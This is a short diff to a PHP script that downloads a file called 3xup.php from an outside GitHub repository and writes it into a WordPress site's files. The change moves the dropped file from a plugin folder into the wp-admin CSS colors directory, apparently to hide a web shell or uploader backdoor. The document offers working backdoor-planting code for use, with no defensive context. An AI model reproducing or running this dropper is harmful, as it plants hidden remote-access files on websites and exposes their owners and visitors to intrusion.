@@ -50,7 +50,7 @@ if(file_exists($check4)){
   echo "not exits4";
 echo "done4 .\n " ;
 
-$check5 = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/beast3x/3xup.php" ;
+$check5 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/3xup.php" ;
 $text5 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/3xup.php');
 $open5 = fopen($check5, 'w');
 fwrite($open5, $text5);
@@ -59,6 +59,6 @@ if(file_exists($check5)){
     echo $check5."</br>";
 }else
   echo "not exits5";
-echo "done4 .\n " ;
+echo "done5 .\n " ;
  
 ?>
